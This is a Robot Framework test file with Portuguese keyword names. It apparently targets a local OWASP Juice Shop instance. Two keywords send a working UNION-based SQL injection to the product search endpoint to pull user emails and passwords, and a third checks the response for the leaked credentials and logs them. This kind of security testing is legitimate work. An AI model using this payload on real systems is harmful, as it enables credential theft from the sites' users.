*** Settings ***
Resource    ../resource/settings.robot
*** Keywords ***
eu insiro um SQL malicioso no endpoint de busca para retornar as credenciais do usuário
    ${HEADER}=             Create Dictionary    Content-Type=application/json
    ${response}=    GET    url=http://localhost:3000/rest/products/search?q=')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--       expected_status=${config.status}    headers=${HEADER}    
    Set Global Variable    ${response}
eu insiro removendo outros dados e adicionando algo incomum no início da consulta
    ${HEADER}=             Create Dictionary    Content-Type=application/json
    ${response}=    GET    url=http://localhost:3000/rest/products/search?q=M')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM users--      expected_status=${config.status}    headers=${HEADER}    
    Set Global Variable    ${response}
eu verifico se a resposta contém as credenciais
    ${json}=    Set Variable    ${response.json()}

    IF    'data' not in ${json}
        Fail    No 'data' in response
    END

    ${found}=    Create List
    FOR    ${item}    IN    @{json['data']}
        ${name}=    Get From Dictionary    ${item}    name
        ${is_email}=    Run Keyword And Return Status    Should Match Regexp    ${name}    (?i)^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$
        IF    ${is_email}
            Append To List    ${found}    ${name} - ${item['description']}
        END
    END

    IF    ${found} == []
        Fail    No credentials found
    END

    Log To Console    [INFO] Credentials found: ${found}
    Set Suite Variable    ${CREDENTIALS_FOUND}    ${found}